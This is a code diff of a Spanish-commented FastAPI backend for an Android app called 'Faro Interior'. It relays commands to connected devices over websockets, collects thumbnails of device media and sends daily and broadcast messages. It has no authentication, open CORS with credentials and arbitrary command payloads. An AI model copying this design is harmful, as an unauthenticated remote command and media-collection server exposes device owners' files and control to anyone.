@@ -1,40 +1,33 @@
 import json
-import base64
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response
-from fastapi.middleware.cors import CORSMiddleware
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect
 from pydantic import BaseModel
 from typing import List, Dict, Any
+from fastapi.middleware.cors import CORSMiddleware
 from urllib.parse import unquote
 
-app = FastAPI(title="Faro Interior - Backend Android (Final)")
+app = FastAPI(title="Faro Interior - Backend Android (Completo y Final)")
 app.add_middleware(
     CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
 )
 
-# --- "BASES DE DATOS" EN MEMORIA (TODAS JUNTAS AL PRINCIPIO) ---
+# --- "BASES DE DATOS" EN MEMORIA ---
 connected_agents: Dict[str, Dict[str, Any]] = {}
+daily_message_cache: Dict[str, Dict[str, str]] = {}
 device_media_cache: Dict[str, Any] = {}
 fetch_status: Dict[str, str] = {}
-daily_message_cache: Dict[str, Dict[str, str]] = {} # <-- MOVIMOS ESTA LÍNEA AQUÍ
 
 # --- MODELOS DE DATOS ---
 class Command(BaseModel):
-    target_id: str
-    action: str
-    payload: Any
+    target_id: str; action: str; payload: Any
 
 class Thumbnail(BaseModel):
-    filename: str
-    small_thumb_b64: str
+    filename: str; small_thumb_b64: str
 
 class ThumbnailChunk(BaseModel):
-    thumbnails: List[Thumbnail]
-    is_final_chunk: bool
+    thumbnails: List[Thumbnail]; is_final_chunk: bool
 
 class BroadcastMessage(BaseModel):
-    device_ids: List[str]
-    image_b64: str
-    text: str
+    device_ids: List[str]; image_b64: str; text: str
 
 # --- ENDPOINTS ---
 
@@ -62,10 +55,35 @@ async def get_agents():
 async def send_command_to_agent(command: Command):
     agent = connected_agents.get(command.target_id)
     if not agent: return {"status": "error", "message": "Agente no conectado"}
+    
+    # Si la orden es escanear, reiniciamos la caché y el estado de ese agente
+    if command.action == "get_thumbnails":
+        device_media_cache[command.target_id] = {}
+        fetch_status[command.target_id] = "loading"
+
     try:
         await agent["ws"].send_text(command.json())
         return {"status": "success", "message": "Comando enviado"}
     except Exception as e: return {"status": "error", "message": str(e)}
+
+# --- RUTAS RESTAURADAS PARA EL VISOR DE ARCHIVOS ---
+
+@app.post("/api/submit_media_chunk/{device_id}")
+async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
+    if device_id not in device_media_cache:
+        device_media_cache[device_id] = {}
+    for thumb in chunk.thumbnails:
+        device_media_cache[device_id][thumb.filename] = thumb.dict()
+    if chunk.is_final_chunk:
+        fetch_status[device_id] = "complete"
+    return {"status": "chunk received"}
+
+@app.get("/api/get_media_list/{device_id}")
+async def get_media_list(device_id: str):
+    status = fetch_status.get(device_id, "complete")
+    thumbnails = device_media_cache.get(device_id, {})
+    return {"status": status, "thumbnails": thumbnails}
+
 
 # --- RUTAS PARA EL "BUZÓN" DE MENSAJES ---
 
@@ -85,7 +103,6 @@ async def set_daily_message(device_id: str, data: dict):
 async def get_daily_message(device_id: str):
     return daily_message_cache.get(device_id, {})
 
-# --- ¡RUTA AÑADIDA PARA MENSAJES MASIVOS! ---
 @app.post("/api/broadcast_message")
 async def broadcast_message(data: BroadcastMessage):
     sent_to_count = 0
@@ -102,5 +119,3 @@ async def broadcast_message(data: BroadcastMessage):
                 print(f"Error al enviar broadcast a {device_id}: {e}")
     print(f"Broadcast enviado a {len(data.device_ids)} dispositivos. {sent_to_count} estaban conectados.")
     return {"status": "broadcast attempted", "sent_to": sent_to_count}
-
-# (Aquí irían tus otras rutas de /api/submit_media_chunk, etc., si las tienes en este servidor)
